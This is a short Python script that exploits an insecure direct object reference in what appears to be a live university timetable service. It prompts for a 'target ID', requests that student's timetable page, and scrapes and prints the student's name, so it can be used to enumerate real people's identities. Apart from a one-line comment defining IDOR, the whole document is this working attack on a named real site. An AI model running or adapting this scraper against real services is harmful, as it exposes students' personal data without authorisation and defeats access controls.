# Insecure direct object reference (IDOR) is a type of access control vulnerability in digital security.

from urllib.request import urlopen
from bs4 import BeautifulSoup

def askID():
    targetID = input("Please enter target ID: ")
    return targetID

def identifyTarget(targetID):
    url = f"https://ical.timetables.qmul.ac.uk/default.aspx?StudentTz&identifier={targetID}&timezone=GMT%20Standard%20Time&default=false"
    #print(url)

    try:
        page = urlopen(url)
    except:
        print("Error opening URL")

    soup = BeautifulSoup(page, 'html.parser')

    spans = soup.findAll('span', {"class": "header-1-2-0"})

    for span in spans:
        if 'Student' in span.get_text():
            #print(span.get_text() + "\n")
            segments = span.get_text().strip().split('Local')
            #print(segments)
            name = segments[0].strip()
            print(name)

def menu():
    print('Press X to exit')

    while True:
        targetID = askID()

        if targetID == 'X':
            break

        identifyTarget(targetID)

def main():
    menu()

if __name__ == "__main__":
    main()
